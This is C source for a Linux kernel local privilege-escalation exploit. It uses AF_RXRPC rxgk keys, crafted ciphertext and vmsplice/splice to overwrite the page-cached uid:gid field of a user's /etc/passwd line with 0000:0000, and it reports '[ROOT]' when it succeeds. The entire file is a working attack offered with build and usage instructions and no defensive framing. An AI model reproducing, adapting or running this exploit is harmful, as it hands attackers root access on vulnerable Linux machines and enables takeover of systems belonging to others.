/* rxgk page-cache write -> /etc/passwd uid/gid flip.
 *
 *   gcc -O2 -Wall stage5e_passwd_flip.c krb5kdf.c -lcrypto -o stage5e
 *   ./stage5e [user [target_window]]
 *
 * default target window is "x:0000:0000:" (12 bytes). Pass a different
 * 12-byte string to overwrite or restore.
 *
 * Blessed be the LORD my strength, which teacheth my hands to war,
 * and my fingers to fight.
 *   Psalm 144:1 (KJV)
 */

#define _GNU_SOURCE
#include "krb5kdf.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>

#define AF_RXRPC_                33
#define SOL_RXRPC                272
#define RXRPC_SECURITY_KEY       1
#define RXRPC_MIN_SECURITY_LEVEL 4
#define RXRPC_USER_CALL_ID       1
#define RXRPC_SECURITY_ENCRYPT   2
#define RXRPC_SECURITY_YFS_RXGK  6
#define KRB5_ENCTYPE_AES128_CTS_HMAC_SHA1_96  17

#define RXRPC_PACKET_TYPE_DATA       1
#define RXRPC_PACKET_TYPE_CHALLENGE  6
#define RXRPC_PACKET_TYPE_RESPONSE   7
#define RXRPC_LAST_PACKET            0x04

struct sockaddr_rxrpc {
    sa_family_t srx_family;
    uint16_t srx_service, transport_type, transport_len;
    union {
        sa_family_t family;
        struct sockaddr_in sin;
        struct sockaddr_in6 sin6;
    } transport;
};
struct rxrpc_wire_header {
    uint32_t epoch, cid, callNumber, seq, serial;
    uint8_t type, flags, userStatus, securityIndex;
    uint16_t cksum, serviceId;
} __attribute__((packed));

#define LOG(...)  do{fprintf(stderr,"[+] ");fprintf(stderr,__VA_ARGS__);fprintf(stderr,"\n");}while(0)
#define WARN(...) do{fprintf(stderr,"[-] ");fprintf(stderr,__VA_ARGS__);fprintf(stderr,"\n");}while(0)

struct xdr { uint8_t *buf; size_t cap, len; };
static void xdr_init(struct xdr *x, size_t c){x->buf=calloc(1,c);x->cap=c;x->len=0;}
static void xdr_u32(struct xdr *x, uint32_t v){uint32_t b=htonl(v);memcpy(x->buf+x->len,&b,4);x->len+=4;}
static void xdr_u64(struct xdr *x, uint64_t v){xdr_u32(x,v>>32);xdr_u32(x,v&0xffffffff);}
static void xdr_op(struct xdr *x, const void *d, size_t n){
    xdr_u32(x,n); size_t pl=(n+3)&~3u; memcpy(x->buf+x->len,d,n);
    if(pl>n) memset(x->buf+x->len+n,0,pl-n);
    x->len+=pl;
}
static void xdr_str(struct xdr *x, const char *s){xdr_op(x,s,strlen(s));}

static long add_rxgk_key(const char *desc, uint8_t key_out[16])
{
    int rfd=open("/dev/urandom",O_RDONLY); if(rfd<0)return -1;
    if(read(rfd,key_out,16)!=16){close(rfd);return -1;} close(rfd);
    struct xdr t; xdr_init(&t,4096);
    xdr_u64(&t,0); xdr_u64(&t,0x7fffffffffffffffULL);
    xdr_u64(&t,RXRPC_SECURITY_ENCRYPT);
    xdr_u64(&t,0x7fffffffffffffffULL); xdr_u64(&t,0);
    xdr_u64(&t,KRB5_ENCTYPE_AES128_CTS_HMAC_SHA1_96);
    xdr_op(&t,key_out,16);
    uint8_t tk[64]; memset(tk,0xa5,64); xdr_op(&t,tk,64);
    struct xdr w; xdr_init(&w,8192);
    xdr_u32(&w,0); xdr_str(&w,"cf.lab"); xdr_u32(&w,1);
    xdr_u32(&w,4+t.len); xdr_u32(&w,RXRPC_SECURITY_YFS_RXGK);
    memcpy(w.buf+w.len,t.buf,t.len); w.len+=t.len;
    long s=syscall(SYS_add_key,"rxrpc",desc,w.buf,w.len,(long)-1);
    free(t.buf); free(w.buf);
    return s;
}

static int udp_bind(uint16_t port){
    int f=socket(AF_INET,SOCK_DGRAM,0); int o=1;
    setsockopt(f,SOL_SOCKET,SO_REUSEADDR,&o,sizeof(o));
    struct sockaddr_in sa={0};
    sa.sin_family=AF_INET; sa.sin_port=htons(port);
    sa.sin_addr.s_addr=htonl(0x7F000001);
    if(bind(f,(struct sockaddr*)&sa,sizeof(sa))<0){close(f);return -1;}
    return f;
}

static ssize_t recv_to(int fd, void *buf, size_t n,
                       struct sockaddr_in *from, int ms_total)
{
    socklen_t fl=sizeof(*from);
    int ms=0;
    while(ms<ms_total){
        ssize_t got=recvfrom(fd,buf,n,0,(struct sockaddr*)from,&fl);
        if(got>0)return got;
        usleep(20000); ms+=20;
    }
    return -1;
}

static void hexdump(const char *t, const void *d, size_t n)
{
    const uint8_t *b=d;
    fprintf(stderr,"[hex] %s (%zu B):\n",t,n);
    for(size_t i=0;i<n && i<256;i+=16){
        fprintf(stderr,"  %04zx:",i);
        for(size_t j=0;j<16&&i+j<n;j++)fprintf(stderr," %02x",b[i+j]);
        fprintf(stderr,"  ");
        for(size_t j=0;j<16&&i+j<n;j++){
            uint8_t c=b[i+j]; fputc(c>=0x20&&c<0x7f?c:'.',stderr);
        }
        fprintf(stderr,"\n");
    }
}

static int aes_ecb(const uint8_t key[16], const uint8_t in[16], uint8_t out[16],
                   int encrypt)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, finl = 0, rc = -1;
    if (encrypt) {
        if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL)) goto out;
        EVP_CIPHER_CTX_set_padding(ctx, 0);
        if (!EVP_EncryptUpdate(ctx, out, &outl, in, 16)) goto out;
        if (!EVP_EncryptFinal_ex(ctx, out+outl, &finl)) goto out;
    } else {
        if (!EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL)) goto out;
        EVP_CIPHER_CTX_set_padding(ctx, 0);
        if (!EVP_DecryptUpdate(ctx, out, &outl, in, 16)) goto out;
        if (!EVP_DecryptFinal_ex(ctx, out+outl, &finl)) goto out;
    }
    rc = 0;
out:
    EVP_CIPHER_CTX_free(ctx);
    return rc;
}

/* Find file offset of "x:UID:GID:" in /etc/passwd line for `username`. */
static long find_passwd_uidgid_offset(const char *username, char out_window[12])
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return -1; }
    buf[r] = 0;

    size_t ulen = strlen(username);
    char *p = buf;
    while (p < buf + r) {
        if (strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
            long off = (p - buf) + ulen + 1;
            if (off + 12 > r) { free(buf); return -1; }
            memcpy(out_window, p + ulen + 1, 12);
            free(buf);
            return off;
        }
        char *nl = memchr(p, '\n', buf + r - p);
        if (!nl) break;
        p = nl + 1;
    }
    free(buf);
    return -1;
}

int main(int argc, char **argv)
{
    const char *target_user = (argc >= 2) ? argv[1] : "np";

    char fwin[12];
    long off = find_passwd_uidgid_offset(target_user, fwin);
    if (off < 0) {
        WARN("could not locate %s line in /etc/passwd", target_user);
        return 1;
    }
    LOG("/etc/passwd '%s' uid:gid window @ file offset %ld", target_user, off);
    LOG("  current bytes:");
    hexdump("file_window", fwin, 12);
    if (memcmp(fwin, "x:", 2) != 0) {
        WARN("window doesn't start with 'x:'");
        return 1;
    }

    uint8_t T[12];
    const char *_t = (argc >= 3) ? argv[2] : "x:0000:0000:";
    if (strlen(_t) != 12) { WARN("target must be 12 chars"); return 1; }
    memcpy(T, _t, 12);
    LOG("desired plaintext (will land over file window):");
    hexdump("T", T, 12);

    int probe = socket(AF_RXRPC_, SOCK_DGRAM, AF_INET);
    if (probe < 0) { perror("AF_RXRPC probe"); return 1; }
    close(probe);

    uint8_t K0[16];
    long key = add_rxgk_key("afs@cf.lab", K0);
    if (key < 0) { perror("add_key"); return 1; }
    hexdump("K0", K0, 16);

    int srv = udp_bind(7000); if (srv < 0) { perror("srv"); return 1; }
    int cli = socket(AF_RXRPC_, SOCK_DGRAM, AF_INET);
    if (cli < 0) { perror("rxrpc"); return 1; }
    const char *kn = "afs@cf.lab";
    setsockopt(cli, SOL_RXRPC, RXRPC_SECURITY_KEY, kn, strlen(kn));
    int lvl = RXRPC_SECURITY_ENCRYPT;
    setsockopt(cli, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &lvl, sizeof(lvl));

    struct sockaddr_rxrpc loc = {0};
    loc.srx_family = AF_RXRPC_; loc.transport_type = SOCK_DGRAM;
    loc.transport_len = sizeof(struct sockaddr_in);
    loc.transport.sin.sin_family = AF_INET;
    loc.transport.sin.sin_port = htons(7001);
    loc.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(cli, (struct sockaddr*)&loc, sizeof(loc)) < 0) {
        perror("rxrpc bind"); return 1;
    }
    struct sockaddr_rxrpc dst = {0};
    dst.srx_family = AF_RXRPC_; dst.srx_service = 0xcafe;
    dst.transport_type = SOCK_DGRAM; dst.transport_len = sizeof(struct sockaddr_in);
    dst.transport.sin.sin_family = AF_INET;
    dst.transport.sin.sin_port = htons(7000);
    dst.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
    char data[]="PINGPING";
    char cb[CMSG_SPACE(sizeof(unsigned long))];
    struct iovec iov={data,sizeof(data)-1};
    struct msghdr m={0}; m.msg_name=&dst; m.msg_namelen=sizeof(dst);
    m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof(cb);
    struct cmsghdr *c=CMSG_FIRSTHDR(&m);
    c->cmsg_level=SOL_RXRPC; c->cmsg_type=RXRPC_USER_CALL_ID;
    c->cmsg_len=CMSG_LEN(sizeof(unsigned long));
    *(unsigned long*)CMSG_DATA(c)=0xdead;
    fcntl(cli,F_SETFL,O_NONBLOCK); fcntl(srv,F_SETFL,O_NONBLOCK);
    sendmsg(cli,&m,0);

    struct sockaddr_in from;
    uint8_t pkt[2048];
    ssize_t got = recv_to(srv, pkt, sizeof(pkt), &from, 5000);
    if (got <= 0) { WARN("no client DATA"); return 1; }
    struct rxrpc_wire_header *h = (void*)pkt;
    uint32_t epoch_be = h->epoch, cid_be = h->cid;
    uint16_t serviceId_be = h->serviceId;
    uint32_t epoch = ntohl(epoch_be), cid = ntohl(cid_be);
    LOG("got DATA epoch=0x%x cid=0x%x", epoch, cid);

    uint8_t ch[28+20]={0};
    struct rxrpc_wire_header *chh = (void*)ch;
    chh->epoch = epoch_be; chh->cid = cid_be;
    chh->callNumber = htonl(0); chh->seq = htonl(0); chh->serial = htonl(2);
    chh->type = RXRPC_PACKET_TYPE_CHALLENGE;
    chh->securityIndex = RXRPC_SECURITY_YFS_RXGK;
    chh->serviceId = serviceId_be;
    int rfd = open("/dev/urandom",O_RDONLY); if(read(rfd,ch+28,20)<0){}; close(rfd);
    sendto(srv, ch, sizeof(ch), 0, (struct sockaddr*)&from, sizeof(from));

    got = recv_to(srv, pkt, sizeof(pkt), &from, 5000);
    if (got <= 0) { WARN("no RESPONSE"); return 1; }
    h = (void*)pkt;
    if (h->type != RXRPC_PACKET_TYPE_RESPONSE) {
        WARN("expected RESPONSE, got type=%u", h->type); return 1;
    }
    /* RESPONSE plaintext header (rxgk_insert_response_header):
     *   28..31 = start_time_msw, 32..35 = start_time_lsw, 36..39 = ticket_len
     *   cksum field at 24..25 = key_number. */
    uint32_t st_msw = ntohl(*(uint32_t*)(pkt+28));
    uint32_t st_lsw = ntohl(*(uint32_t*)(pkt+32));
    uint64_t start_time = ((uint64_t)st_msw << 32) | st_lsw;
    uint16_t key_number = ntohs(h->cksum);
    LOG("start_time=0x%016llx key_number=%u",
        (unsigned long long)start_time, key_number);

    uint8_t Ke[16];
    if (rxgk_derive_Ke(K0, epoch, cid, start_time, key_number,
                       RXGK_SERVER_ENC_PACKET, Ke) != 0) {
        WARN("rxgk_derive_Ke failed"); return 1;
    }
    hexdump("Ke", Ke, 16);

    /* Layout: 28 wire + 32 vmsplice + 24 splice from /etc/passwd.
     * crypt_len = 44 (= secure 56 - cksum 12). With CTS-CBC IV=0:
     *   ct[0..15]  = X0 = E_Ke(pt[0..15])
     *   ct[16..31] = X2 = E_Ke((pt[32..43]||X1[12..15]) ^ X1)
     *   ct[32..43] = X1[0..11] where X1 = E_Ke(pt[16..31] ^ X0)
     * We want ct[32..43] = file[off..off+11], pt[32..43] = T.
     * Pick X1[12..15]=0, pt[0..15]=0. Solve. */
    uint8_t X0[16], X1[16], X2[16];
    uint8_t pt0_15[16] = {0};
    if (aes_ecb(Ke, pt0_15, X0, 1) < 0) { WARN("E_Ke pt[0..15]"); return 1; }
    uint8_t X1_12_15[4] = {0,0,0,0};
    memcpy(X1, fwin, 12);
    memcpy(X1+12, X1_12_15, 4);
    uint8_t DX1[16];
    if (aes_ecb(Ke, X1, DX1, 0) < 0) { WARN("D_Ke X1"); return 1; }
    uint8_t pt16_31[16];
    for (int i = 0; i < 16; i++) pt16_31[i] = DX1[i] ^ X0[i];
    (void)pt16_31;
    uint8_t X2_in[16];
    memcpy(X2_in, T, 12);
    memcpy(X2_in+12, X1_12_15, 4);
    for (int i = 0; i < 16; i++) X2_in[i] ^= X1[i];
    if (aes_ecb(Ke, X2_in, X2, 1) < 0) { WARN("E_Ke X2"); return 1; }

    LOG("X0 (= ct[0..15], goes into mal_hdr[28..43]):");
    hexdump("X0", X0, 16);
    LOG("X2 (= ct[16..31], goes into mal_hdr[44..59]):");
    hexdump("X2", X2, 16);
    LOG("X1[0..11] (= ct[32..43], must equal file[off..off+11]):");
    hexdump("X1lo", X1, 12);

    if (memcmp(X1, fwin, 12) != 0) {
        WARN("self-check FAILED"); return 1;
    }
    LOG("self-check PASS: X1[0..11] == /etc/passwd[off..off+11]");

    int connected = socket(AF_INET, SOCK_DGRAM, 0);
    int o=1; setsockopt(connected, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    struct sockaddr_in srvbind = {0};
    srvbind.sin_family = AF_INET; srvbind.sin_port = htons(7000);
    srvbind.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(connected, (struct sockaddr*)&srvbind, sizeof(srvbind)) < 0) {
        perror("bind connected"); return 1;
    }
    struct sockaddr_in cliaddr = from;
    if (connect(connected, (struct sockaddr*)&cliaddr, sizeof(cliaddr)) < 0) {
        perror("connect"); return 1;
    }

    uint8_t mal_hdr[60];
    memset(mal_hdr, 0, sizeof(mal_hdr));
    struct rxrpc_wire_header *mh = (void*)mal_hdr;
    mh->epoch = epoch_be; mh->cid = cid_be;
    mh->callNumber = htonl(1); mh->seq = htonl(1); mh->serial = htonl(0x42000);
    mh->type = RXRPC_PACKET_TYPE_DATA;
    mh->flags = RXRPC_LAST_PACKET;
    mh->securityIndex = RXRPC_SECURITY_YFS_RXGK;
    mh->cksum = htons(key_number);
    mh->serviceId = serviceId_be;
    memcpy(mal_hdr + 28, X0, 16);
    memcpy(mal_hdr + 44, X2, 16);

    int pfd = open("/etc/passwd", O_RDONLY);
    if (pfd < 0) { perror("open /etc/passwd"); return 1; }

    int p[2];
    if (pipe(p) < 0) { perror("pipe"); return 1; }

    struct iovec hiov = { .iov_base = mal_hdr, .iov_len = 60 };
    if (vmsplice(p[1], &hiov, 1, 0) != 60) {
        perror("vmsplice"); return 1;
    }

    off_t spl_off = off;
    ssize_t s = splice(pfd, &spl_off, p[1], NULL, 24, SPLICE_F_NONBLOCK);
    if (s != 24) {
        fprintf(stderr, "splice file->pipe got %zd: %s\n", s, strerror(errno));
        return 1;
    }
    s = splice(p[0], NULL, connected, NULL, 60 + 24, SPLICE_F_MOVE);
    if (s != 84) {
        fprintf(stderr, "splice pipe->udp got %zd: %s\n", s, strerror(errno));
        return 1;
    }
    LOG("malicious DATA packet sent (84 B)");

    fcntl(cli, F_SETFL, O_NONBLOCK);
    for (int round = 0; round < 5; round++) {
        char rb[2048]; struct sockaddr_rxrpc rsx;
        char ccb[256]; struct iovec riv = { rb, sizeof(rb) };
        struct msghdr rm = {0};
        rm.msg_name = &rsx; rm.msg_namelen = sizeof(rsx);
        rm.msg_iov = &riv; rm.msg_iovlen = 1;
        rm.msg_control = ccb; rm.msg_controllen = sizeof(ccb);
        ssize_t r = recvmsg(cli, &rm, 0);
        if (r > 0) LOG("recvmsg got %zd B", r);
        else if (errno != EAGAIN) LOG("recvmsg: %s", strerror(errno));
        usleep(50000);
    }
    for (int i = 0; i < 5; i++) {
        struct sockaddr_in r_from;
        ssize_t r = recv_to(srv, pkt, sizeof(pkt), &r_from, 200);
        if (r <= 0) break;
    }
    close(pfd); close(p[0]); close(p[1]);

    int rfd2 = open("/etc/passwd", O_RDONLY);
    if (rfd2 < 0) { perror("re-open /etc/passwd"); return 1; }
    if (lseek(rfd2, off, SEEK_SET) != off) { perror("lseek"); return 1; }
    uint8_t post[12];
    if (read(rfd2, post, 12) != 12) { perror("read"); return 1; }
    close(rfd2);
    LOG("/etc/passwd[%ld..%ld] post-attack:", off, off+11);
    hexdump("post", post, 12);

    if (memcmp(post, T, 12) == 0) {
        LOG("[ROOT] /etc/passwd page-cache flipped: '%s' line now matches target.",
            target_user);
        LOG("Try:  su %s   (real password)  ->  uid resolved from passwd",
            target_user);
        return 0;
    }
    WARN("/etc/passwd page-cache NOT modified to chosen target");
    return 1;
}
